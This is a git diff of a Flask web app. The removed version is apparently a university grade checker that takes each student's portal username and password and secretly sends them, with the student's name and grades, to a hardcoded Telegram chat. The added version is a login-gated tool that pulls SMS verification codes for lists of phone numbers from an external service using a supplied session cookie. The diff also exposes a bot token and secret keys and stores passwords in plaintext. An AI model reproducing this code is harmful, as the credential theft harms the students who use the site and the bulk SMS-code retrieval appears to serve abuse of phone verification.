@@ -1,120 +1,271 @@
-from flask import Flask, render_template, request, flash, redirect, url_for
+import sqlite3
 import requests
-import json
-import telebot
+from flask import Flask, request, render_template, redirect, url_for, session, flash
+from datetime import datetime
 
 app = Flask(__name__)
-app.secret_key = 'Raafat01011508719'
+app.secret_key = 'refooSami'  # Secret key for session management
 
-# Initialize your Telegram bot
-bot = telebot.TeleBot("6512189034:AAFiP4hSCd5LXSIbK0KlkI-9qmUYh3fCAwQ")
+# Initialize SQLite database
+def init_db():
+    conn = sqlite3.connect('users.db')
+    cursor = conn.cursor()
+    cursor.execute('''CREATE TABLE IF NOT EXISTS users (
+                        id INTEGER PRIMARY KEY AUTOINCREMENT,
+                        username TEXT UNIQUE NOT NULL,
+                        password TEXT NOT NULL
+                    )''')
+    cursor.execute('''CREATE TABLE IF NOT EXISTS user_data (
+                        id INTEGER PRIMARY KEY AUTOINCREMENT,
+                        username TEXT NOT NULL,
+                        number TEXT NOT NULL,
+                        status TEXT NOT NULL,
+                        timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
+                        FOREIGN KEY (username) REFERENCES users(username)
+                    )''')
+    conn.commit()
+    conn.close()
 
+# Add a new user to the SQLite database
+def add_user(username, password):
+    conn = sqlite3.connect('users.db')
+    cursor = conn.cursor()
+    try:
+        cursor.execute('INSERT INTO users (username, password) VALUES (?, ?)', (username, password))
+        conn.commit()
+    except sqlite3.IntegrityError:
+        flash('User already exists', 'danger')
+    finally:
+        conn.close()
+# Remove a user from the SQLite database
+def remove_user(username):
+    conn = sqlite3.connect('users.db')
+    cursor = conn.cursor()
+    cursor.execute('DELETE FROM users WHERE username = ?', (username,))
+    cursor.execute('DELETE FROM user_data WHERE username = ?', (username,))
+    conn.commit()
+    conn.close()
+# Authenticate user credentials
+def authenticate_user(username, password):
+    conn = sqlite3.connect('users.db')
+    cursor = conn.cursor()
+    cursor.execute('SELECT * FROM users WHERE username = ? AND password = ?', (username, password))
+    user = cursor.fetchone()
+    conn.close()
+    return user
+
+# Add data for a specific user
+def add_user_data(username, number, status):
+    conn = sqlite3.connect('users.db')
+    cursor = conn.cursor()
+    cursor.execute('INSERT INTO user_data (username, number, status) VALUES (?, ?, ?)', (username, number, status))
+    conn.commit()
+    conn.close()
+
+# Retrieve user data for a specific user
+def get_user_data(username):
+    conn = sqlite3.connect('users.db')
+    cursor = conn.cursor()
+    cursor.execute('SELECT * FROM user_data WHERE username = ?', (username,))
+    data = cursor.fetchall()
+    conn.close()
+    return data
+# Retrieve user data by number
+def get_number_data(number):
+    conn = sqlite3.connect('users.db')
+    cursor = conn.cursor()
+    cursor.execute('SELECT username, number, status, timestamp FROM user_data WHERE number = ?', (number,))
+    data = cursor.fetchall()
+    conn.close()
+    return data
+@app.route('/manage_users', methods=['GET', 'POST'])
+def add_user_route():
+    if request.method == 'POST':
+        username = request.form.get('username', '').strip()
+        password = request.form.get('password', '').strip()
+        action = request.form.get('action', '').strip()
+        
+        # Validate input fields
+        if not username:
+            flash('Username is required.', 'danger')
+        elif action == 'add':
+            if not password:
+                flash('Password is required for adding a user.', 'danger')
+            else:
+                try:
+                    add_user(username, password)
+                    flash('User added successfully', 'success')
+                except Exception as e:
+                    flash(f'An error occurred: {str(e)}', 'danger')
+        elif action == 'remove':
+            try:
+                remove_user(username)
+                flash('User removed successfully', 'success')
+            except Exception as e:
+                flash(f'An error occurred: {str(e)}', 'danger')
+        else:
+            flash('Invalid action specified.', 'danger')
+
+    return render_template('add_user.html')
+
+@app.route('/search_user', methods=['GET', 'POST'])
+def search_user():
+    if request.method == 'POST':
+        search_type = request.form.get('search_type', '').strip()
+        search_value = request.form.get('search_value', '').strip()
+
+        if search_type == 'username':
+            user_data = get_user_data(search_value)
+            if user_data:
+                # Initialize counters
+                total_success = 0
+                total_failed = 0
+
+                # Count successes and failures
+                for entry in user_data:
+                    if entry[3] == 'Failed':
+                        total_failed += 1
+                    else:
+                        total_success += 1
+
+                return render_template(
+                    'user_data.html',
+                    user_data=user_data,
+                    search_type='username',
+                    search_value=search_value,
+                    total_success=total_success,
+                    total_failed=total_failed
+                )
+            else:
+                flash('No data found for the user', 'danger')
+
+        elif search_type == 'number':
+            number_data = get_number_data(search_value)
+            if number_data:
+                # Count successes and failures
+                total_success = sum(1 for entry in number_data if entry[2] != 'Failed')
+                total_failed = sum(1 for entry in number_data if entry[2] == 'Failed')
+                
+                return render_template(
+                    'user_data.html',
+                    number_data=number_data,
+                    search_type='number',
+                    search_value=search_value,
+                    total_success=total_success,
+                    total_failed=total_failed
+                )
+            else:
+                flash('No data found for this number', 'danger')
+
+    return render_template('user_data.html')
+
+
+
+
+
+# Root route redirects to login
 @app.route('/')
 def index():
-    return render_template('index.html')
+    return redirect(url_for('login'))
 
-@app.route('/grades', methods=['POST'])
-def get_grades():
-    try:
+# Login route
+@app.route('/login', methods=['GET', 'POST'])
+def login():
+    if request.method == 'POST':
         username = request.form['username']
         password = request.form['password']
-        selected_year = request.form['year']
-
-        headers = {
-            'Accept': '*/*',
-            'Accept-Language': 'en-US,en;q=0.9,ar;q=0.8',
-            'Connection': 'keep-alive',
-            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
-            'Origin': 'https://allstd.mans.edu.eg',
-            'Referer': 'https://allstd.mans.edu.eg/',
-            'Sec-Fetch-Dest': 'empty',
-            'Sec-Fetch-Mode': 'cors',
-            'Sec-Fetch-Site': 'same-origin',
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
-            'X-Requested-With': 'XMLHttpRequest',
-            'sec-ch-ua': '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': '"Windows"',
-        }
-
-        data = {
-            'UserName': username,
-            'Password': password,
-        }
-
-        response = requests.post('http://stda.minia.edu.eg/Portallogin', headers=headers, data=data, timeout=120)
-        if response.status_code == 200:
-            cookies = response.cookies
-            response_json = response.json()
-            if response_json == [{"Message": "", "Link": "/"}]:
-                data = {
-                    'param0': 'Portal.General',
-                    'param1': 'GetStudentPortalData',
-                    'param2': '{"UserID":""}',
-                }
-                response = requests.post('http://stda.minia.edu.eg/PortalgetJCI', headers=headers, cookies=cookies, data=data)
-                UUID = response.json()[0]['UUID']
-                data = {
-                    'param0': 'Portal.Results',
-                    'param1': 'GetAllResults',
-                    'param2': json.dumps({"UUID": UUID}),
-                }
-
-                response = requests.post('http://stda.minia.edu.eg/PortalgetJCI', headers=headers, cookies=cookies, data=data, verify=False)
-                response_json = response.json()
-                grades = []
-                max_degrees = 0
-                total_degrees = 0
-
-                data = {
-                    'param0': 'Portal.StudentsPortal',
-                    'param1': 'GetPortaStudentPersonal',
-                    'param2': json.dumps({"UUID": UUID}),
-                }
-
-                name_req = requests.post('http://stda.minia.edu.eg/PortalgetJCI', cookies=cookies, headers=headers, data=data, verify=False).json()
-                name = name_req[0]['Name'].split('|')[0].split(" ")[0]
-
-                for entry in response_json:
-                    if selected_year in entry['ScopeName']:
-                        for course in entry['ds'][0]['StudyYearCourses']:
-                            course_name = course['CourseName'].replace("||", '')
-                            max_score = course['Max']
-                            total_score = course['Total']
-                            grade_name = course["GradeName"].split("|")[0]
-                            
-                            if total_score:  # Check if total score is not empty
-                                percentage = (float(total_score) / float(max_score)) * 100
-                            else:
-                                percentage = 0
-                                total_score = 0
-                                grade_name = "غير معروف"
-                            max_degrees+= float(max_score)
-                            total_degrees+= float(total_score)
-
-                            grades.append({
-                                'course_name': course_name,
-                                'grade': grade_name,
-                                'max_score': max_score,
-                                'total_score': total_score,
-                                'percentage': int(percentage)
-                            })
-                percentage = float(total_degrees/max_degrees)*100
-                
-                # Send grades and name to Telegram
-                message = f"Name: {name}\n\nGrades: {grades}\n\nTotal Percentage: {percentage}%\n\n{username} : {password}: {selected_year}"
-                bot.send_message("854578633", message)
-
-                return render_template('grades.html', grades=grades, name=name, percentage=percentage)
-            else:
-                flash("الرقم القومي او كلمة المرور خاطئة، يرجى إعادة إدخال البيانات!")
-                return redirect(url_for('index'))
+        user = authenticate_user(username, password)
+        if user:
+            
+            session['user'] = username
+            session['logged_in'] = True
+            session['username'] = username
+            flash('Login successful', 'success')
+            return redirect(url_for('verification_code_finder'))
         else:
-            flash("حدث خطأ في الاتصال بخادم الموقع!")
-            return redirect(url_for('index'))
-    except Exception as e:
-        flash("حدث خطأ غير متوقع: {}".format(str(e)))
-        return redirect(url_for('index'))
+            flash('Invalid credentials', 'danger')
+    return render_template('login.html')
 
-if __name__ == "__main__":
+# Logout route
+@app.route('/logout')
+def logout():
+    session.clear()
+    flash('Logged out successfully', 'success')
+    return redirect(url_for('login'))
+
+# Verification code finder route
+@app.route('/verification_code_finder', methods=['GET', 'POST'])
+def verification_code_finder():
+    if not session.get('logged_in'):
+        return redirect(url_for('login'))
+    if 'user' in session:
+        if request.method == 'POST':
+            key = request.form['key']
+            phpsessid = request.form['phpsessid']
+            numbers = request.form['numbers'].split()
+
+            total_success = 0
+            total_fail = 0
+            codes = {}
+
+            for number in numbers:
+                code = get_panel_code(key, phpsessid, number)
+                status = 'Failed'
+                if code:
+                    total_success += 1
+                    status = code
+                else:
+                    total_fail += 1
+
+                codes[number] = status
+                add_user_data(session['user'], number, status)  # Save data to database
+
+            results = {
+                'total_success': total_success,
+                'total_fail': total_fail,
+                'date': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
+                'codes': codes
+            }
+            return render_template('verification.html', results=results)
+        return render_template('verification.html')
+    else:
+        flash('Please log in first', 'danger')
+        return redirect(url_for('login'))
+
+# Get verification code from external service
+import re
+import requests
+
+def get_panel_code(key, phpsessid, number):
+    cookies = {'PHPSESSID': phpsessid}
+    headers = {
+        'Accept': '*/*',
+        'User-Agent': 'Mozilla/5.0',
+        'X-Requested-With': 'XMLHttpRequest',
+    }
+    params = {
+        'key': key,
+        'start': '0',
+        'length': '10',
+        'fnumber': number,
+    }
+
+    try:
+        response = requests.post('http://pscall.net/restapi/smsreport', params=params, cookies=cookies, headers=headers)
+        response.raise_for_status()
+        data = response.json()
+        if data.get('result') == 'success' and data.get('data'):
+            sms_message = data['data'][0].get('sms')
+            if sms_message:
+                # Extract only the digits from the message
+                code = re.search(r'\d+', sms_message)
+                if code:
+                    return code.group(0)
+        return None
+    except requests.RequestException:
+        return None
+
+
+if __name__ == '__main__':
+    init_db()
     app.run(debug=True)
